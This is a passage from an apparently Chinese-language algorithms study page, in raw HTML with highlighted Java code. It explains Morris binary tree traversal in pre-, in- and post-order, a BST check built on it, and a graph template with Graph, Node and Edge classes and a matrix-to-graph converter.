data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">morris</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> mostRight<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        mostRight <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span> <span class="token comment">// 只是先初始化为左子树的根节点</span>        <span class="token comment">// 是否有左孩子</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 找到最右节点</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> cur<span class="token punctuation">)</span> mostRight <span class="token operator">=</span> mostRight<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 说明第一次来到cur节点，就让现在的最右节点的右指针指向cur</span>                mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> cur<span class="token punctuation">;</span>                cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="先序遍历-1"><a href="#先序遍历-1" class="headerlink" title="先序遍历"></a>先序遍历</h4><p>对于先序来说，对于</p><p>1）只到达一次的节点，就直接打印</p><p>2）会到达两次的节点，只打印第一次</p><blockquote><p>只需要在<code>到达一次的节点</code>和<code>到达两次的节点第一次到达</code>时添加打印代码即可</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">morrisPre</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> mostRight<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        mostRight <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span> <span class="token comment">// 只是先初始化为左子树的根节点</span>        <span class="token comment">// 是否有左孩子</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 找到最右节点</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> cur<span class="token punctuation">)</span> mostRight <span class="token operator">=</span> mostRight<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 说明第一次来到cur节点，就让现在的最右节点的右指针指向cur</span>                <span class="token comment">// 第一次到达就打印</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> cur<span class="token punctuation">;</span>                cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 没有左子树的节点只到达一次</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="中序遍历-1"><a href="#中序遍历-1" class="headerlink" title="中序遍历"></a>中序遍历</h4><p>对于中序来说，对于</p><p>1）只到达一次的节点，就直接打印</p><p>2）会到达两次的节点，只打印第二次</p><blockquote><p><code>到达一次的节点</code>和<code>到达两次的节点第二次到达</code>的地方在判断是否有左孩子外面相遇，添加一处打印语句即可</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">morrisIn</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> mostRight<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        mostRight <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span> <span class="token comment">// 只是先初始化为左子树的根节点</span>        <span class="token comment">// 是否有左孩子</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 找到最右节点</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> cur<span class="token punctuation">)</span> mostRight <span class="token operator">=</span> mostRight<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 说明第一次来到cur节点，就让现在的最右节点的右指针指向cur</span>                mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> cur<span class="token punctuation">;</span>                cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 第二次到达（上面的最近的else跳出来之后就到这里） 和 没有左子树的节点只到达一次 都归结在这里</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>                cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="后序遍历-1"><a href="#后序遍历-1" class="headerlink" title="后序遍历"></a>后序遍历</h4><p>对于后序来说，</p><p>当第二次到达节点时，逆序打印该节点左子树的右边界（不含该节点），morris遍历完成之后，再逆序打印整棵树的右边界</p><p>如何逆序打印一棵树的右边界？修改右边界的右指针全都指向父，根节点指向空，打印之后再改回来</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">reverse</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Node</span> par <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token class-name">Node</span> temp<span class="token punctuation">;</span>    par<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        temp <span class="token operator">=</span> par<span class="token punctuation">;</span>        par <span class="token operator">=</span> cur<span class="token punctuation">;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        par<span class="token punctuation">.</span>right <span class="token operator">=</span> temp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> par<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printEdge</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">Node</span> tail <span class="token operator">=</span> <span class="token function">reverse</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Node</span> cur <span class="token operator">=</span> tail<span class="token punctuation">;</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">reverse</span><span class="token punctuation">(</span>tail<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">morrisPos</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> mostRight<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        mostRight <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span> <span class="token comment">// 只是先初始化为左子树的根节点</span>        <span class="token comment">// 是否有左孩子</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 找到最右节点</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> cur<span class="token punctuation">)</span> mostRight <span class="token operator">=</span> mostRight<span class="token punctuation">.</span>right<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 说明第一次来到cur节点，就让现在的最右节点的右指针指向cur</span>                mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> cur<span class="token punctuation">;</span>                cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                                    mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>                <span class="token comment">// 第二次到达，逆序打印该节点左子树的右边界</span>                <span class="token comment">// 注意在将最右节点调成null之后才能打印</span>                <span class="token function">printEdge</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printEdge</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="判断搜索二叉树-1"><a href="#判断搜索二叉树-1" class="headerlink" title="判断搜索二叉树"></a>判断搜索二叉树</h4><p>改写中序遍历即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isBST</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> cur <span class="token operator">=</span> head<span class="token punctuation">;</span>        <span class="token class-name">Node</span> mostRight<span class="token punctuation">;</span>        <span class="token keyword">int</span> preValue <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            mostRight <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span> <span class="token comment">// 只是先初始化为左子树的根节点</span>            <span class="token comment">// 是否有左孩子</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token comment">// 找到最右节点</span>                <span class="token keyword">while</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">!=</span> cur<span class="token punctuation">)</span> mostRight <span class="token operator">=</span> mostRight<span class="token punctuation">.</span>right<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>mostRight<span class="token punctuation">.</span>right <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 说明第一次来到cur节点，就让现在的最右节点的右指针指向cur</span>                    mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> cur<span class="token punctuation">;</span>                    cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span> mostRight<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token comment">//            // 第二次到达（上面的最近的else跳出来之后就到这里） 和 没有左子树的节点只到达一次 都归结在这里</span><span class="token comment">//            System.out.println(cur.value);</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>value <span class="token operator">&lt;=</span> preValue<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            preValue <span class="token operator">=</span> cur<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>right<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>使用树形DP：方法必须做第三次信息的强整合（一个节点必须要完左子树的信息，要完右子树的信息，然后回到该节点，做整合），必须用树形DP</p><p>使用Morris遍历：不需要强整合，可以用树形DP，但是Morris遍历是最优解（因为Morris遍历不能第三次回到某个节点）</p><h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><p>对于图的表达方式有很多，如邻接表法，邻接矩阵法，对于特定的问题也可以用一个数组，方式多种多样，但是图问题使用的算法是一样的，所以我们可以自己把一种表达方式练熟所有算法即可，将该表达方式作为模板，这样，遇到别的表达方式时，只需要将该表达方式转化为我们熟悉的模板即可</p><p>模板如下：</p><p><code>图结构</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Graph</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> nodes<span class="token punctuation">;</span> <span class="token comment">// 点集</span>    <span class="token keyword">public</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> edges<span class="token punctuation">;</span><span class="token comment">// 边集</span>    <span class="token keyword">public</span> <span class="token class-name">Graph</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        nodes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        edges <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>点结构</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> value<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> in<span class="token punctuation">;</span> <span class="token comment">// 入度</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> out<span class="token punctuation">;</span> <span class="token comment">// 出度</span>    <span class="token keyword">public</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">></span></span> nexts<span class="token punctuation">;</span> <span class="token comment">// 从该点指向的点（指向该点的点不算）</span>    <span class="token keyword">public</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">></span></span> edges<span class="token punctuation">;</span> <span class="token comment">// 从该点指出去的边</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>        in <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        out <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        nexts <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        edges <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>边结构</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Edge</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> weight<span class="token punctuation">;</span> <span class="token comment">// 权重</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> from<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token keyword">int</span> weight<span class="token punctuation">,</span> <span class="token class-name">Node</span> from<span class="token punctuation">,</span> <span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>weight <span class="token operator">=</span> weight<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>from <span class="token operator">=</span> from<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token keyword">to</span> <span class="token operator">=</span> <span class="token keyword">to</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里不需要考虑有向还是无向，因为无向图就是特殊的有向图</p></blockquote><p>假设题目给定的表达方式如图</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm2_f3.png"></p><p>那么将该表达方式转化为模板代码如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Graph</span> <span class="token function">createGraph</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Graph</span> graph <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Graph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> matrix<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Integer</span> weight <span class="token operator">=</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">Integer</span> from <span class="token operator">=</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">Integer</span> <span class="token keyword">to</span> <span class="token operator">=</span> matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Node</span> fromNode <span class="token operator">=</span> graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Node</span> toNode <span class="token operator">=</span> graph<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Edge</span> newEdge <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Edge</span><span class="token punctuation">(</span>weight<span class="token punctuation">,</span> fromNode<span class="token punctuation">,</span> toNode<span class="token punctuation">)</span><span class="token punctuation">;</span>        fromNode<span class="token punctuation">.</span>nexts<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>toNode<span class="token punctuation">)</span><span class="token 